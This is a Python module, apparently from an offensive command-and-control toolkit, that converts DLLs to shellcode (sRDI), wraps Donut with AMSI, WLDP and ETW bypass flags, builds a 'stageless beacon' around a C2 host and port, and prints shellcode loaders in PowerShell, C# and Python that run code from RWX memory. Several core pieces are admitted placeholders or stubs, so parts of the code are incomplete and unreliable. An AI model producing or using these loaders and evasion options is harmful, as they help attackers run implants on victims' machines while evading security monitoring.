"""
Reflective Loader & Stageless Payload Support
sRDI / Donut integration for in-memory execution
"""
import base64
import struct
import hashlib
import os
from typing import Dict, Optional, Tuple, List
from dataclasses import dataclass


@dataclass
class PayloadConfig:
    """Configuration for reflective payload"""
    architecture: str = "x64"  # x86, x64, any
    bypass_amsi: bool = True
    bypass_wldp: bool = True
    bypass_etw: bool = True
    compress: bool = True
    encrypt: bool = True
    entry_point: Optional[str] = None


class ReflectiveLoader:
    """
    Reflective DLL/PE loader implementation.
    Loads executables entirely in memory without touching disk.
    """
    
    # sRDI (Shellcode Reflective DLL Injection) stub
    SRDI_STUB_X64 = """
    ; sRDI x64 stub - Position Independent
    ; Self-contained reflective DLL loader
    
    [BITS 64]
    
    _start:
        ; Save registers
        push rbx
        push rbp
        push rdi
        push rsi
        push r12
        push r13
        push r14
        push r15
        
        ; Get current address (PIC)
        call get_rip
    get_rip:
        pop rbp
        sub rbp, get_rip
        
        ; Find kernel32.dll
        mov rax, gs:[0x60]          ; PEB
        mov rax, [rax + 0x18]       ; PEB->Ldr
        mov rax, [rax + 0x20]       ; InMemoryOrderModuleList
        mov rax, [rax]              ; Second entry (kernel32)
        mov rax, [rax]              ; Third entry
        mov r12, [rax + 0x20]       ; DllBase
        
        ; Parse exports to find LoadLibraryA & GetProcAddress
        ; ... (implementation continues)
        
        ; Load the embedded DLL reflectively
        ; ... (implementation continues)
        
        ; Restore and return
        pop r15
        pop r14
        pop r13
        pop r12
        pop rsi
        pop rdi
        pop rbp
        pop rbx
        ret
    """
    
    def __init__(self, config: PayloadConfig = None):
        self.config = config or PayloadConfig()
    
    def convert_dll_to_shellcode(self, dll_path: str) -> bytes:
        """
        Convert DLL to position-independent shellcode (sRDI technique).
        
        This is a simplified implementation - real sRDI is more complex.
        """
        with open(dll_path, 'rb') as f:
            dll_data = f.read()
        
        # Parse PE headers
        pe_info = self._parse_pe(dll_data)
        
        # Generate shellcode wrapper
        shellcode = self._generate_srdi_wrapper(dll_data, pe_info)
        
        return shellcode
    
    def _parse_pe(self, pe_data: bytes) -> Dict:
        """Parse PE headers"""
        if pe_data[:2] != b'MZ':
            raise ValueError("Invalid PE file")
        
        # Get PE header offset
        e_lfanew = struct.unpack('<I', pe_data[0x3C:0x40])[0]
        
        # Verify PE signature
        if pe_data[e_lfanew:e_lfanew+4] != b'PE\x00\x00':
            raise ValueError("Invalid PE signature")
        
        # Parse COFF header
        machine = struct.unpack('<H', pe_data[e_lfanew+4:e_lfanew+6])[0]
        num_sections = struct.unpack('<H', pe_data[e_lfanew+6:e_lfanew+8])[0]
        
        # Determine architecture
        arch = "x64" if machine == 0x8664 else "x86"
        
        # Parse optional header
        optional_offset = e_lfanew + 24
        magic = struct.unpack('<H', pe_data[optional_offset:optional_offset+2])[0]
        
        if magic == 0x20B:  # PE32+
            entry_point = struct.unpack('<I', pe_data[optional_offset+16:optional_offset+20])[0]
            image_base = struct.unpack('<Q', pe_data[optional_offset+24:optional_offset+32])[0]
        else:  # PE32
            entry_point = struct.unpack('<I', pe_data[optional_offset+16:optional_offset+20])[0]
            image_base = struct.unpack('<I', pe_data[optional_offset+28:optional_offset+32])[0]
        
        return {
            "architecture": arch,
            "entry_point": entry_point,
            "image_base": image_base,
            "num_sections": num_sections,
            "pe_offset": e_lfanew
        }
    
    def _generate_srdi_wrapper(self, dll_data: bytes, pe_info: Dict) -> bytes:
        """Generate sRDI shellcode wrapper"""
        # This is a conceptual implementation
        # Real sRDI requires actual shellcode assembly
        
        # XOR key for basic obfuscation
        xor_key = os.urandom(4)
        
        # Encrypt DLL data
        encrypted_dll = self._xor_encrypt(dll_data, xor_key)
        
        # Build shellcode structure
        # [loader stub][xor key][dll size][encrypted dll]
        
        loader_stub = self._get_loader_stub(pe_info["architecture"])
        
        shellcode = bytearray()
        shellcode.extend(loader_stub)
        shellcode.extend(xor_key)
        shellcode.extend(struct.pack('<I', len(dll_data)))
        shellcode.extend(encrypted_dll)
        
        return bytes(shellcode)
    
    def _get_loader_stub(self, arch: str) -> bytes:
        """Get loader stub for architecture"""
        if arch == "x64":
            # Minimal x64 stub (placeholder)
            return bytes([
                0x48, 0x89, 0xE0,  # mov rax, rsp
                0x48, 0x83, 0xE4, 0xF0,  # and rsp, -16
                0x50,  # push rax
                # ... actual loader code would go here
            ])
        else:
            # Minimal x86 stub (placeholder)
            return bytes([
                0x89, 0xE0,  # mov eax, esp
                0x83, 0xE4, 0xF0,  # and esp, -16
                0x50,  # push eax
                # ... actual loader code would go here
            ])
    
    def _xor_encrypt(self, data: bytes, key: bytes) -> bytes:
        """XOR encrypt data"""
        result = bytearray(len(data))
        key_len = len(key)
        for i in range(len(data)):
            result[i] = data[i] ^ key[i % key_len]
        return bytes(result)


class DonutIntegration:
    """
    Integration with Donut shellcode generator.
    https://github.com/TheWover/donut
    
    Generates position-independent shellcode from:
    - .NET assemblies
    - PE files (EXE/DLL)
    - VBScript/JScript
    """
    
    DONUT_ARCH = {
        "x86": 1,
        "x64": 2,
        "any": 3
    }
    
    DONUT_BYPASS = {
        "none": 1,
        "abort": 2,
        "continue": 3
    }
    
    def __init__(self):
        self.donut_available = self._check_donut()
    
    def _check_donut(self) -> bool:
        """Check if donut is available"""
        try:
            import donut
            return True
        except ImportError:
            return False
    
    def generate_shellcode(self, 
                           input_file: str,
                           arch: str = "x64",
                           bypass_amsi: bool = True,
                           bypass_wldp: bool = True,
                           bypass_etw: bool = True,
                           compress: bool = True,
                           entropy: int = 3) -> Optional[bytes]:
        """
        Generate shellcode from input file using Donut.
        
        Args:
            input_file: Path to .NET assembly or PE file
            arch: Target architecture (x86/x64/any)
            bypass_amsi: Bypass AMSI
            bypass_wldp: Bypass WLDP (Device Guard)
            bypass_etw: Bypass ETW
            compress: Compress payload
            entropy: Entropy level (1=none, 2=random names, 3=random+encryption)
        """
        if not self.donut_available:
            return self._fallback_shellcode(input_file)
        
        try:
            import donut
            
            shellcode = donut.create(
                file=input_file,
                arch=self.DONUT_ARCH.get(arch, 2),
                bypass=3 if bypass_amsi else 1,
                compress=1 if compress else 0,
                entropy=entropy
            )
            
            return shellcode
        except Exception as e:
            print(f"Donut generation failed: {e}")
            return None
    
    def _fallback_shellcode(self, input_file: str) -> bytes:
        """Fallback if Donut not available"""
        # Return a simple loader stub
        return b'\x90' * 10  # NOPs as placeholder
    
    def generate_donut_command(self,
                               input_file: str,
                               output_file: str,
                               arch: str = "x64",
                               bypass: bool = True) -> str:
        """Generate Donut CLI command"""
        cmd = f"donut -i {input_file} -o {output_file} -a {self.DONUT_ARCH.get(arch, 2)}"
        
        if bypass:
            cmd += " -b 3"  # AMSI/WLDP/ETW bypass
        
        cmd += " -z 2"  # aPLib compression
        cmd += " -e 3"  # Random names + encryption
        
        return cmd


class StagelessPayload:
    """
    Stageless payload generator.
    Embeds all functionality into single payload - no staging required.
    """
    
    def __init__(self):
        self.reflective_loader = ReflectiveLoader()
        self.donut = DonutIntegration()
    
    def generate_stageless_beacon(self,
                                   c2_host: str,
                                   c2_port: int,
                                   sleep_time: int = 60,
                                   jitter: int = 30,
                                   arch: str = "x64") -> Dict:
        """
        Generate stageless beacon payload.
        
        Returns dict with:
        - shellcode: Raw shellcode bytes
        - powershell: PowerShell loader
        - csharp: C# loader
        - python: Python loader
        """
        # Generate beacon configuration
        config = self._generate_config(c2_host, c2_port, sleep_time, jitter)
        
        # Generate shellcode
        shellcode = self._generate_beacon_shellcode(config, arch)
        
        return {
            "shellcode": shellcode,
            "shellcode_b64": base64.b64encode(shellcode).decode(),
            "powershell": self._generate_ps_loader(shellcode),
            "csharp": self._generate_csharp_loader(shellcode),
            "python": self._generate_python_loader(shellcode)
        }
    
    def _generate_config(self, c2_host: str, c2_port: int, 
                         sleep_time: int, jitter: int) -> bytes:
        """Generate beacon configuration"""
        config = {
            "host": c2_host,
            "port": c2_port,
            "sleep": sleep_time,
            "jitter": jitter,
            "id": os.urandom(8).hex()
        }
        
        import json
        return json.dumps(config).encode()
    
    def _generate_beacon_shellcode(self, config: bytes, arch: str) -> bytes:
        """Generate beacon shellcode with embedded config"""
        # XOR key
        key = os.urandom(16)
        
        # Encrypt config
        encrypted_config = self._rc4_encrypt(config, key)
        
        # Build shellcode
        if arch == "x64":
            shellcode = self._build_x64_shellcode(key, encrypted_config)
        else:
            shellcode = self._build_x86_shellcode(key, encrypted_config)
        
        return shellcode
    
    def _rc4_encrypt(self, data: bytes, key: bytes) -> bytes:
        """RC4 encryption"""
        S = list(range(256))
        j = 0
        for i in range(256):
            j = (j + S[i] + key[i % len(key)]) % 256
            S[i], S[j] = S[j], S[i]
        
        i = j = 0
        result = []
        for byte in data:
            i = (i + 1) % 256
            j = (j + S[i]) % 256
            S[i], S[j] = S[j], S[i]
            result.append(byte ^ S[(S[i] + S[j]) % 256])
        
        return bytes(result)
    
    def _build_x64_shellcode(self, key: bytes, config: bytes) -> bytes:
        """Build x64 shellcode"""
        # Placeholder - real implementation would generate actual shellcode
        shellcode = bytearray()
        
        # Add stub
        shellcode.extend(b'\x48\x83\xEC\x28')  # sub rsp, 40
        shellcode.extend(b'\x48\x31\xC9')      # xor rcx, rcx
        
        # Add key
        shellcode.extend(key)
        
        # Add config size
        shellcode.extend(struct.pack('<I', len(config)))
        
        # Add encrypted config
        shellcode.extend(config)
        
        return bytes(shellcode)
    
    def _build_x86_shellcode(self, key: bytes, config: bytes) -> bytes:
        """Build x86 shellcode"""
        shellcode = bytearray()
        
        # Add stub
        shellcode.extend(b'\x83\xEC\x14')  # sub esp, 20
        shellcode.extend(b'\x31\xC9')       # xor ecx, ecx
        
        # Add key
        shellcode.extend(key)
        
        # Add config size
        shellcode.extend(struct.pack('<I', len(config)))
        
        # Add encrypted config
        shellcode.extend(config)
        
        return bytes(shellcode)
    
    def _generate_ps_loader(self, shellcode: bytes) -> str:
        """Generate PowerShell loader"""
        b64_shellcode = base64.b64encode(shellcode).decode()
        
        # Split for obfuscation
        chunks = [b64_shellcode[i:i+60] for i in range(0, len(b64_shellcode), 60)]
        
        loader = '''
# PowerShell Stageless Loader
$a = @"
'''
        loader += '\n'.join(chunks)
        loader += '''
"@

$b = [System.Convert]::FromBase64String($a -replace '\\s','')

# Allocate memory
$c = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Get-WinAPI kernel32 VirtualAlloc),
    [Func[IntPtr, UInt32, UInt32, UInt32, IntPtr]]
)
$d = $c.Invoke([IntPtr]::Zero, $b.Length, 0x3000, 0x40)

# Copy shellcode
[System.Runtime.InteropServices.Marshal]::Copy($b, 0, $d, $b.Length)

# Execute
$e = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    $d, [Action]
)
$e.Invoke()
'''
        return loader
    
    def _generate_csharp_loader(self, shellcode: bytes) -> str:
        """Generate C# loader"""
        b64_shellcode = base64.b64encode(shellcode).decode()
        
        return f'''
using System;
using System.Runtime.InteropServices;

class Program {{
    [DllImport("kernel32.dll")]
    static extern IntPtr VirtualAlloc(IntPtr a, uint b, uint c, uint d);
    
    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(IntPtr a, uint b, IntPtr c, IntPtr d, uint e, IntPtr f);
    
    [DllImport("kernel32.dll")]
    static extern UInt32 WaitForSingleObject(IntPtr h, UInt32 m);

    static void Main() {{
        byte[] sc = Convert.FromBase64String("{b64_shellcode}");
        
        IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)sc.Length, 0x3000, 0x40);
        Marshal.Copy(sc, 0, addr, sc.Length);
        
        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
        WaitForSingleObject(hThread, 0xFFFFFFFF);
    }}
}}
'''
    
    def _generate_python_loader(self, shellcode: bytes) -> str:
        """Generate Python loader"""
        b64_shellcode = base64.b64encode(shellcode).decode()
        
        return f'''
import ctypes
import base64

# Shellcode
sc = base64.b64decode("{b64_shellcode}")

# Windows API
k32 = ctypes.windll.kernel32
k32.VirtualAlloc.restype = ctypes.c_void_p
k32.RtlMoveMemory.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t]

# Allocate RWX memory
addr = k32.VirtualAlloc(0, len(sc), 0x3000, 0x40)

# Copy shellcode
k32.RtlMoveMemory(addr, sc, len(sc))

# Execute
thread = k32.CreateThread(0, 0, addr, 0, 0, 0)
k32.WaitForSingleObject(thread, -1)
'''


# Convenience functions
def generate_stageless(c2_host: str, c2_port: int, arch: str = "x64") -> Dict:
    """Generate stageless payload"""
    gen = StagelessPayload()
    return gen.generate_stageless_beacon(c2_host, c2_port, arch=arch)


def convert_to_shellcode(file_path: str) -> bytes:
    """Convert PE/DLL to shellcode"""
    loader = ReflectiveLoader()
    return loader.convert_dll_to_shellcode(file_path)
